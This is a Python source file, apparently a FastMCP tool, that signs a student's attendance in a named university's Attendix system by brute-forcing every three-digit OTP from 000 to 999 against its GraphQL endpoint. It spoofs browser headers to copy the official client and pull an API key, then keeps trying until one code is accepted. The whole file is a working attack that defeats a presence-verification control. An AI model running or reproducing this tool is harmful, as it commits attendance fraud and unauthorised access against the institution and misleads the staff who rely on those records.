import asyncio
import httpx
import os
import json
from dotenv import load_dotenv
from fastmcp import Context

# Load environment variables
load_dotenv()

# --- CONFIGURATION ---
KEY_ENDPOINT = "https://api.apiit.edu.my/attendix_key/api_key"
APPSYNC_ENDPOINT = "https://attendix.apu.edu.my/graphql"

# Headers required to mimic the legitimate client for Key Retrieval
KEY_FETCH_HEADERS = {
    "Origin": "https://apspace.apu.edu.my",
    "Referer": "https://apspace.apu.edu.my/",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
}

async def get_x_api_key(client: httpx.AsyncClient, ctx: Context) -> str:
    """
    Get X-API Key from cache, .env, or API endpoint
    """
    # Check if cached in context
    if hasattr(ctx, 'x_api_key_cache') and ctx.x_api_key_cache:
        return ctx.x_api_key_cache

    # Check .env file
    env_key = os.getenv("X_API_KEY")
    if env_key:
        ctx.x_api_key_cache = env_key
        return env_key

    # Fetch from API
    await ctx.info("Fetching X-API Key from remote...")
    try:
        response = await client.get(KEY_ENDPOINT, headers=KEY_FETCH_HEADERS)
        response.raise_for_status()
        
        data = response.json()
        key = data.get("API_KEY")
        
        if not key:
            raise ValueError("API Key not found in response")

        # Cache in context
        ctx.x_api_key_cache = key
        await ctx.info("X-API Key fetched and cached successfully")
        return key
    except Exception as e:
        await ctx.error(f"Failed to fetch API key: {str(e)}")
        raise e

# --- INNER FUNCTION: CORE LOGIC ---

async def try_otp_mutation(client: httpx.AsyncClient, otp: str, jwt: str, x_api_key: str):
    """
    Attempts a single GraphQL mutation with a specific OTP.
    """
    query = """
    mutation updateAttendance($otp: String!) {
      updateAttendance(otp: $otp) {
        id
        attendance
        classcode
        date
        startTime
        endTime
      }
    }
    """
    
    headers = {
        "Authorization": f"Bearer {jwt}",
        "x-api-key": x_api_key,
        "Content-Type": "application/json"
    }
    
    payload = {
        "operationName": "updateAttendance",
        "query": query,
        "variables": {"otp": otp}
    }

    try:
        response = await client.post(APPSYNC_ENDPOINT, json=payload, headers=headers, timeout=10.0)
        return response.json()
    except httpx.ReadTimeout:
        return {"error": "Request timeout"}
    except Exception as e:
        return {"error": str(e)}

# --- BRUTE FORCE FUNCTION ---

async def brute_force_attendance(jwt_token: str, ctx: Context) -> str:
    """
    Automates attendance signing by brute forcing OTPs from 000 to 999.
    """
    async with httpx.AsyncClient(timeout=30.0) as client:
        try:
            x_api_key = await get_x_api_key(client, ctx)
        except Exception as e:
            return f"System Error: Failed to retrieve X-API Key. {str(e)}"

        await ctx.report_progress(0, 1000)
        await ctx.info("Starting OTP Brute Force (000-999)...")
        
        for i in range(1000):
            otp = f"{i:03}"
            
            if i % 50 == 0:
                await ctx.report_progress(i, 1000)
            
            result = await try_otp_mutation(client, otp, jwt_token, x_api_key)
            
            if result.get("data") and result["data"]["updateAttendance"]:
                att_data = result["data"]["updateAttendance"]
                await ctx.report_progress(1000, 1000)
                return f"SUCCESS: Attendance signed! OTP: {otp}. Class: {att_data.get('classcode')}."
            
            elif result.get("errors"):
                error_msg = result["errors"][0].get("message", "Unknown error")
                if "not registered" in error_msg.lower():
                    await ctx.info(f"OTP {otp}: Valid class found but student not registered")
            else:
                await ctx.info(f"OTP {otp}: No response")
    
    return "FAILED: Exhausted all OTPs (000-999) without success."
